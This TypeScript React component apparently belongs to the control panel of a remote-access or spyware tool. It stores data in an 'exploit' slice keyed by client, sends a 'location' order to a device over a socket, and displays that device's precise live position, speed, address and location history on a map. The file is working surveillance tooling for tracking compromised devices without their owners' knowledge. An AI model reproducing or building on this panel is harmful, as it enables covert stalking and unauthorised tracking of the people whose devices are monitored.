
import { useEffect, useRef, useState } from 'react'
import { Button } from '@/components/ui/button'
import { MapPin, RefreshCw } from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'
import type { LocationEntry } from '@/store/slices/exploit-slice'
import { flagFromCountry } from '@/lib/format'

export function LocationTab({ clientId }: { clientId: string }) {
  const loc = useAppSelector((s) => s.exploit.byClient[clientId]?.location)
  const history = useAppSelector(
    (s) => s.exploit.byClient[clientId]?.locationHistory ?? [],
  )
  const mapDivRef = useRef<HTMLDivElement>(null)
  const mapRef = useRef<any>(null)
  const markerRef = useRef<any>(null)
  const [leafletReady, setLeafletReady] = useState(false)

  // request once on mount
  useEffect(() => {
    emitOrder(clientId, 'location')
  }, [clientId])

  // lazy-load leaflet only on client
  useEffect(() => {
    let disposed = false
    ;(async () => {
      const L = await import('leaflet')
      // load CSS
      if (!document.getElementById('leaflet-css')) {
        const link = document.createElement('link')
        link.id = 'leaflet-css'
        link.rel = 'stylesheet'
        link.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css'
        document.head.appendChild(link)
      }
      if (disposed) return
      setLeafletReady(true)
    })()
    return () => {
      disposed = true
    }
  }, [])

  // init map when leaflet + container + location available
  useEffect(() => {
    if (!leafletReady || !mapDivRef.current || !loc) return
    let L = (window as any).L
    if (!L) return
    if (!mapRef.current) {
      mapRef.current = L.map(mapDivRef.current).setView([loc.lat, loc.lng], 15)
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap',
      }).addTo(mapRef.current)
      const icon = L.divIcon({
        className: '',
        html: `<div style="width:18px;height:18px;border-radius:9999px;background:#10b981;box-shadow:0 0 0 6px rgba(16,185,129,.3),0 0 0 1px #022c22;border:2px solid #fff;"></div>`,
        iconSize: [18, 18],
        iconAnchor: [9, 9],
      })
      markerRef.current = L.marker([loc.lat, loc.lng], { icon }).addTo(
        mapRef.current,
      )
    } else {
      const newPos = L.latLng(loc.lat, loc.lng)
      markerRef.current.setLatLng(newPos)
      mapRef.current.panTo(newPos)
    }
    markerRef.current
      .bindPopup(`<b>${loc.status ?? 'Location'}</b><br>${new Date(loc.time).toLocaleString()}`)
      .openPopup()
  }, [leafletReady, loc?.lat, loc?.lng])

  useEffect(() => {
    return () => {
      if (mapRef.current) {
        mapRef.current.remove()
        mapRef.current = null
      }
    }
  }, [])

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <MapPin className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">
            Live Location
          </h3>
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => emitOrder(clientId, 'location')}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <RefreshCw className="h-3.5 w-3.5" /> Refresh
        </Button>
      </div>

      {!loc ? (
        <div className="rounded-xl border border-white/10 bg-black/30 py-12 text-center text-xs text-zinc-600">
          Requesting precise location from device…
        </div>
      ) : (
        <>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            <Info label="Position">
              {loc.lat.toFixed(4)}, {loc.lng.toFixed(4)}
            </Info>
            <Info label="Accuracy">
              {loc.accuracy ? `${loc.accuracy.toFixed(1)} m` : '—'}
            </Info>
            <Info label="Provider">
              {loc.provider?.toUpperCase() ?? '—'}
            </Info>
            <Info label="Speed">
              {loc.speed ? `${loc.speed.toFixed(1)} m/s` : '0'}
            </Info>
          </div>
          {loc.address && (
            <div className="rounded-lg border border-white/10 bg-black/30 px-3 py-2 text-xs text-zinc-300">
              <span className="text-zinc-500">Address: </span>
              {loc.address}
              {loc.country ? ` ${flagFromCountry(loc.country)}` : ''}
            </div>
          )}

          <div
            ref={mapDivRef}
            className="h-72 w-full rounded-xl border border-white/10 overflow-hidden"
          />

          <div>
            <div className="text-[11px] uppercase tracking-wider text-zinc-500 mb-2">
              History
            </div>
            <div className="rounded-xl border border-white/10 overflow-hidden">
              <div className="grid grid-cols-4 gap-2 bg-zinc-900/60 px-3 py-2 text-[10px] uppercase tracking-wider text-zinc-500 border-b border-white/10">
                <span>Time</span>
                <span>Lat/Lng</span>
                <span>Acc</span>
                <span>Prov</span>
              </div>
              <div className="max-h-48 overflow-y-auto scrollbar-emerald divide-y divide-white/5">
                {history.length === 0 ? (
                  <div className="px-3 py-6 text-center text-xs text-zinc-600">
                    No history yet.
                  </div>
                ) : (
                  history.map((h: LocationEntry, i) => (
                    <div
                      key={i}
                      className="grid grid-cols-4 gap-2 px-3 py-1.5 text-[11px] hover:bg-white/[0.03]"
                    >
                      <span className="text-zinc-400 truncate">
                        {new Date(h.time).toLocaleTimeString()}
                      </span>
                      <span className="font-mono text-zinc-300 truncate">
                        {h.lat.toFixed(4)}, {h.lng.toFixed(4)}
                      </span>
                      <span className="text-zinc-400">
                        {h.accuracy ? `${h.accuracy.toFixed(0)}m` : '—'}
                      </span>
                      <span className="text-zinc-400 uppercase">
                        {h.provider?.slice(0, 3) ?? '—'}
                      </span>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </>
      )}
    </div>
  )
}

function Info({
  label,
  children,
}: {
  label: string
  children: React.ReactNode
}) {
  return (
    <div className="rounded-lg border border-white/10 bg-black/30 px-3 py-2">
      <div className="text-[10px] uppercase tracking-wider text-zinc-600">
        {label}
      </div>
      <div className="text-sm text-zinc-200 font-mono truncate">{children}</div>
    </div>
  )
}
